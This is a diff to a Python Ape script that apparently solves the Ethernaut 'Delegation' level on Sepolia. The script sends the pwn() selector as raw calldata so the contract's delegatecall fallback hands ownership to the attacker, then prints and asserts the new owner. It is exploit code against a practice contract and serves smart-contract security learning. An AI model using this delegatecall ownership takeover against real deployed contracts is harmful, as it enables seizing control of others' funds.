@@ -1,29 +1,30 @@
 #!/usr/bin/python3
 from ape import accounts, networks, project
-from colorama import Fore
-
-# * colours
-green = Fore.GREEN
-red = Fore.RED
-blue = Fore.BLUE
-magenta = Fore.MAGENTA
-reset = Fore.RESET
+from rich.console import Console
+from eth_utils import keccak
 
 
-# sepolia: 0xE3C8089e2FBE88995DEA29D91f983aeBE8cDF043
-ADDRESS = "0xE3C8089e2FBE88995DEA29D91f983aeBE8cDF043"
+# sepolia: 0x456165ce9dd13A160e53f739d05995d4BeCFdb4c
+ADDRESS = "0x456165ce9dd13A160e53f739d05995d4BeCFdb4c"
 
+console = Console()
 
 def attack():
     attacker = accounts[0]
+    attacker.set_autosign(True)
     contract = project.Delegation.at(ADDRESS)
 
-    print(f"{green}Owner Before The Hack: {magenta}{contract.owner()}{reset}")
-    print(f"{red}Attacking Now...{reset}")
+    console.print(f"[green]Owner Before The Hack: [magenta]{contract.owner()}")
+    console.print("[red]Attacking Now...")
 
-    # The call context i.e. msg.sender & msg.value will of the calling contract to the delegated contract. So sharing the storage
+    # The call context i.e. msg.sender & msg.value will be of the calling contract to the delegated contract. So sharing the storage & will update the state vars of the calling contract
 
-    print(f"{green}Attacker Balance After The Hack: {magenta}{contract.owner()}{reset}")
+    data = keccak(text="pwn()")
+
+    contract(sender=attacker, data=data, gas=1000000)
+    #contract.pwn(sender=attacker, gas=3000000)
+
+    console.print(f"[green]Owner After The Hack: [magenta]{contract.owner()}")
 
     assert contract.owner() == attacker.address
 
